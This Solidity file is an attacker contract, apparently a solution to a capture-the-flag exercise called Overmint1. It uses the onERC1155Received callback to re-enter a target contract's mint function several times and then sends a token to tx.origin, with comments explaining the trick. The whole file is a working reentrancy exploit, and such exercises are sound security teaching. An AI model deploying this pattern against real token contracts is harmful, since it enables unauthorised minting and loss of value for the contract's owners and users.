// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {Overmint1_ERC1155} from "../Overmint1-ERC1155.sol";

contract Overmint1_ERC1155_Attacker {
    Overmint1_ERC1155 overmint1_ERC1155;
    uint256 count;
    constructor(address overmint1_ERC1155_) {
        overmint1_ERC1155 = Overmint1_ERC1155(overmint1_ERC1155_);
         

    }

    function attack() public {
        overmint1_ERC1155.mint(0,"0x00");
    }


    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4){
        if(count < 4){
             count++;
            overmint1_ERC1155.mint(0,"0x00");
      
        }
        if(count == 4){
            // uint256[] memory ids = new uint256[](5);
            // uint256[] memory amounts = new uint256[](5);
            // ids[0] = 0;
            // ids[1] = 0;
            // ids[2] = 0;
            // ids[3] = 0;
            // ids[4] = 0;
            // amounts[0] = 1;
            // amounts[1] = 1;
            // amounts[2] = 1;
            // amounts[3] = 1;
            // amounts[4] = 1;
            //why only transfer 1 will success?
            // because we send to and EOA (tx.origin), so it will not be called onERC1155Received
            // it will proceed with the mint flow
            overmint1_ERC1155.safeTransferFrom(address(this), tx.origin, 0, 1, "0x00");
        
        }
//   
        return bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
    }

}
